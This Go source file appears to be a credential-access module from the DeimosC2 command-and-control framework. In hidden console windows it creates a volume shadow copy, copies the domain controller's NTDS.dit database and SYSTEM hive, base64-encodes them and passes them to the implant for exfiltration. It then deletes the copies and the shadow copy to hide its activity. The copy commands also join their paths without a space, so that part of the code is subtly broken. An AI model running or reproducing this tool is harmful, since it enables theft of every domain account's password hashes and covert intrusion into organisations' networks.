package main

import (
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"log"
	"net"
	"net/rpc/jsonrpc"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/DeimosC2/DeimosC2/lib/modulescommon"
)

type downloadFiles struct {
	NTDSFile   string
	NTDSData   string
	Systemfile string
	Systemdata string
}

func runModule(port string) {

	conn, err := net.Dial("tcp", "127.0.0.1:"+port)
	if err != nil {
		log.Fatal("Dialing:", err)
	}
	defer conn.Close()

	client := jsonrpc.NewClient(conn)

	cmdName := "cmd.exe"

	ntds := "C:\\Windows\\temp\\ntds.dit"
	system := "C:\\Windows\\temp\\SYSTEM"

	var reply int

	cmdArgs := []string{"/c", "vssadmin create shadow /for=c:"}
	cmd := exec.Command(cmdName, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmdArgs2 := []string{"/c", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit" + ntds}
	cmd2 := exec.Command(cmdName, cmdArgs2...)
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Run()

	cmdArgs3 := []string{"/c", "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM" + system}
	cmd3 := exec.Command(cmdName, cmdArgs3...)
	cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd3.Run()

	cmdArgs4 := []string{"/c", "vssadmin delete shadows /for=c: /oldest"}
	cmd4 := exec.Command(cmdName, cmdArgs4...)
	cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd4.Run()

	ntdsData, err := ioutil.ReadFile(ntds)
	if err != nil {
		logging.Logger.Println("Error reading ntds: ", err)
	}

	systemData, err := ioutil.ReadFile(system)
	if err != nil {
		logging.Logger.Println(err)
	}

	downloadStruct := downloadFiles{
		NTDSFile:   filepath.Base(ntds),
		NTDSData:   base64.StdEncoding.EncodeToString(ntdsData),
		Systemfile: filepath.Base(system),
		Systemdata: base64.StdEncoding.EncodeToString(systemData),
	}

	sendData, err := json.Marshal(downloadStruct)

	sendon := modulescommon.ModuleCom{"", true, false, false, "ntdsdump", "credential_access", ".exe", sendData}
	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}

	time.Sleep(3 * time.Second)

	err = os.Remove(ntds)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}

	err = os.Remove(system)
	if err != nil {
		log.Fatal("Problem Deleteting File:", err)
	}

	//Once all the data hase been sent then we will tell the server to close the other half of the module
	sendon = modulescommon.ModuleCom{"", true, false, true, "ntdsdump", "credential_access", ".exe", nil}

	err = client.Call("ModData.SendData", &sendon, &reply)
	if err != nil {
		log.Fatal("RPC error:", err)
	}
}

func main() {
	runModule(os.Args[1])
}
